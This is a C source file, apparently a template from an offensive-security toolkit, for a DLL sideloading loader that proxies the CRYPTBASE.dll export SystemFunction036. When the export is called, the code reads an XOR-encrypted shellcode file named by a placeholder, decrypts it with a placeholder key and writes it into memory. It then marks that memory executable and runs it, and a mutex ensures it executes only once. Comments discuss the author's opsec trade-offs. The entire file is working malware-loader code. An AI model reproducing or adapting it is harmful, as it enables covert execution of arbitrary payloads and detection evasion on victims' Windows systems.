/*
    Credit to icyguider - https://github.com/icyguider/LatLoader/blob/main/src/sideloader.c
    Modified by choi 
        - added mutex since disksnapshot was loading DLL + executing proxy function multiple times 
        - changed XOR decryption because original one didn't worked for me. It's worse opsec, but it works. 
*/
#include <windows.h>
#include <stdio.h>

void XOR(unsigned char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int hittem()
{
    const char* fileName = "{{FILENAME}}";

    // Get size of raw shellcode file
    FILE* file = fopen(fileName, "rb");
    if (file == NULL) return 1;
    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fclose(file);

    // Allocate memory according to size, and read contents of file into shellcodefer
    file = fopen(fileName, "rb");
    unsigned char* shellcode = (unsigned char*)malloc(size);
    int bytes_read = fread(shellcode, sizeof(unsigned char), size, file);
    fclose(file);
    
    // XOR decode
    char key[] = "{{KEY}}";
    XOR(shellcode, size, key, sizeof(key));

    // page read write 
    void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE); 
    DWORD mode = 0;
    GetConsoleMode(hStdin, &mode);

    memcpy(exec, shellcode, size);

    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    // VirtualProtect to page read execute 
    DWORD oldProtect;
    VirtualProtect(exec, size, PAGE_EXECUTE_READ, &oldProtect);

    // IDK if this will mess up things. Will see later. 
    SetConsoleMode(hStdin, mode & (~ENABLE_ECHO_INPUT));

    ((void(*)())exec)();

    return 0;
}

typedef BOOL(*SystemFunction036_Type)(void* buffer, ULONG len);

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


__declspec(dllexport) DWORD SystemFunction036_Proxy(void* buffer, ULONG len)
{
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\MyUniqueMutexName");
    if (hMutex == NULL) {
        // Handle error, maybe someday 
    } else {
        if (GetLastError() != ERROR_ALREADY_EXISTS) {
            hittem();
        }
        CloseHandle(hMutex);
    }

    // Load original DLL and get function pointer
    SystemFunction036_Type Original_SystemFunction036 = (SystemFunction036_Type)GetProcAddress(LoadLibrary("C:\\Windows\\System32\\CRYPTBASE.dll"), "SystemFunction036");
    BOOL result = Original_SystemFunction036(buffer, len);
    return result;
}